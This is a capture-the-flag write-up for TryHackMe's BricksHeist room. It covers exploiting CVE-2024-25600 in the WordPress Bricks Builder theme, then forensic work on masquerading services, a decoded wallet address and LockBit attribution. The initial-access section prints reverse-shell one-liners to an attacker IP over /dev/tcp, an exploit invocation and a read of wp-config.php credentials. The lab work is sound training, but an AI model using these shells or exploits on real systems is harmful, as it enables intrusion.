# 🛡️ TryHackMe – BricksHeist - Writeup

## 📌 Overview
**Room Name:** BricksHeist  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** WordPress / RCE / Forensics / Cryptocurrency Investigation

WordPress machine running Bricks Builder. Initial access via CVE-2024-25600, then internal forensics on a malware-infected system to identify masquerading services and attribute the attack to a ransomware group via OSINT.

Attack chain overview:

- Port scanning with `rustscan` and WordPress/Bricks Builder version identification
- Web shell acquisition via CVE-2024-25600 (Bricks Builder RCE)
- Reverse shell stabilization bypassing PHP `eval()` constraints
- Identification of masquerading systemd services
- Understanding the WebSockify → VNC bridge architecture
- DB credential extraction from `wp-config.php` and MySQL investigation
- Decoding a triple-encoded wallet address (Hex → Base64 → Base64) from `inet.conf`
- Attributing the attack to the LockBit ransomware group via `chainabuse.com`

---

## 🔍 1. Enumeration

### 🔎 Port Scan
An initial scan with `rustscan` revealed the following open ports:

```bash
rustscan -a <TARGET_IP>
```

```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  WebSockify
443/tcp  open  https (WordPress)
3306/tcp open  mysql
```

Port 80 was running **WebSockify** (a WebSocket → TCP bridge), not plain HTTP — a noteworthy detail for later.

### 🌐 WordPress Investigation
Browsed to the WordPress site on port 443 and analyzed the HTML source:

- Confirmed that the **Bricks Builder** theme was in use
- Discovered an exposed **nonce value** embedded in the page (used later in the exploit)

Ran `wpscan` to identify the version:

```bash
wpscan --url https://<TARGET_IP> --disable-tls-checks
```

**Discovered:** `Bricks Builder 1.9.5`

---

## 🔓 2. Initial Access

### 💀 CVE-2024-25600 (Bricks Builder RCE)
Bricks Builder 1.9.5 contains an unauthenticated RCE vulnerability. The exploit was run using the nonce extracted from the HTML source:

```bash
python3 exploit.py --url https://<TARGET_IP> --nonce <nonce_value>
```

A `Shell>` prompt was returned, allowing arbitrary command execution.

### 🔧 Shell Stabilization
Standard reverse shell attempts from `Shell>` failed:

```bash
# Attempt 1: direct bash (failed)
bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1
# → timed out

# Attempt 2: Python3 (failed)
python3 -c 'import socket...'
# → same result
```

> **Root cause:** `Shell>` operates via PHP `eval()`, where the server waits for the HTTP response. Any foreground connection command blocks the response cycle and times out.

Using `exec` to replace the current process resolved the issue:

```bash
bash -c 'exec bash -i &>/dev/tcp/<KALI_IP>/4444 0>&1'
```

```bash
whoami
# apache
```

**Initial foothold as `apache` established.** ✅

---

## 🚀 3. Internal Investigation: Identifying Suspicious Services

### 🔍 Enumerating Running Services

```bash
systemctl | grep running
```

Among the expected services, several suspicious entries stood out:

| Service Name | Verdict | Reason |
|-------------|---------|--------|
| `getty@tty1.service` | Normal | Standard terminal session manager |
| `ubuntu.service` | **Suspicious** ✅ | Description field contains `TRYHACK3M` |
| `badr.service` | **Suspicious** ✅ | Deletes its own service file 10 seconds after starting (evidence destruction) |
| `nm-inet-dialog` | **Suspicious** ✅ | Name impersonates the legitimate `NetworkManager` service (masquerading) |

> **How to spot malicious services:**
> - Name is uncommon or deliberately mimics a legitimate service (masquerading)
> - Description or binary path deviates from standard system paths
> - Exhibits self-destructive behavior (deletes itself after execution)

### 🌐 Understanding the Network Architecture

```bash
ss -tulnp
```

Port **5901 (VNC)** was found listening on the internal interface:

```text
127.0.0.1:5901   LISTEN   (VNC server)
0.0.0.0:80       LISTEN   (WebSockify)
```

> **Architecture insight:** WebSockify on port 80 bridges external WebSocket connections to the internal VNC server on port 5901. Direct TCP access to VNC is not possible from outside.

---

## 🚀 4. DB Investigation and Credential Discovery

### 🔑 Extracting Credentials from wp-config.php

```bash
cat /var/www/html/wp-config.php
```

The DB password `lamp.sh` was discovered.

```bash
# Attempted but failed
su - root
# → failed

# Root cause: the wp-config.php password is MySQL-specific;
# it is not the system login password
```

Direct MySQL connection from Kali was rejected by host-based access controls. The workaround was to execute SQL non-interactively via the existing shell:

```bash
mysql -u <user> -p<password> -e "SHOW DATABASES;" <dbname>
```

---

## 🚀 5. VNC Connection Attempts

```bash
# Attempted direct connection — failed
vncviewer <TARGET_IP>:5901
# → failed

# Root cause: vncviewer uses raw TCP, but port 80 speaks
# WebSocket — the protocols are incompatible
```

A connection via noVNC (WebSocket-compatible client) was attempted but ultimately left unresolved. The flag was obtained through a different path.

---

## 👑 6. Wallet Address Discovery and Attacker Attribution

### 🔍 Discovering inet.conf
While investigating configuration files on the system, an unusually long hex string was found embedded in `/etc/inet.conf`.

### 🔓 Decoding the Triple-Encoded Payload
The hex string was decoded in three stages:

```bash
# Step 1: Hex → ASCII
echo "<hex_string>" | xxd -r -p

# Step 2: Base64 decode (first pass)
echo "<base64_string>" | base64 -d

# Step 3: Base64 decode (second pass)
echo "<base64_string_2>" | base64 -d
```

> **Important:** The final decoded output contained two wallet addresses concatenated together. They needed to be split at the correct boundary — Bitcoin addresses start with `1`, `3`, or `bc1`, which helps identify the split point.

### 🌐 OSINT Investigation
The recovered wallet addresses were investigated using blockchain explorers:

```
blockchain.com  → verified transaction history
chainabuse.com  → cross-referenced against abuse reports
```

**Result:** Reports on `chainabuse.com` confirmed that the wallet addresses are attributed to the **LockBit ransomware group**. ✅

---

## 📚 Key Takeaways

- 🔍 **Check known CVEs before brute-forcing inputs:** Before trying XSS or SQLi, identify the CMS and plugin versions, then look up known CVEs. The Bricks Builder version was visible in the HTML source from the start.

- 🐚 **Understand the constraints of eval()-based shells:** A `Shell>` environment backed by PHP `eval()` blocks on foreground connections. Using `exec` to replace the process sidesteps the blocking behavior.

- 🔑 **wp-config.php credentials are MySQL-only:** The DB password has no relation to the system login password. Don't assume credential reuse without evidence.

- 🕵️ **Identifying masquerading services:** Malicious services that mimic legitimate names can be spotted by checking the description, binary path, and runtime behavior. Services like `badr.service` that self-delete after launch are a forensics red flag.

- 🌐 **WebSockify is not a plain TCP proxy:** VNC behind WebSockify cannot be reached with a standard TCP client like `vncviewer`. A WebSocket-capable client (e.g., noVNC) is required.

- 🔓 **Multi-layer encoding hides data in plain sight:** Hex + Base64 × 2 can be unraveled step by step. Always check whether decoded output is itself encoded, and watch for concatenated values in the final result.

- 🌍 **Blockchain enables attacker attribution:** Wallet addresses can be cross-referenced on `chainabuse.com` to link them to known threat actors and ransomware campaigns.

---

## 🛠️ Tools Used

- `rustscan`
- `wpscan`
- `curl`
- `python3` (exploit, PTY stabilization)
- `nc` (netcat)
- `systemctl`, `ss`
- `mysql`
- `xxd`, `base64`
- `strings`
- blockchain.com, chainabuse.com (OSINT)

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
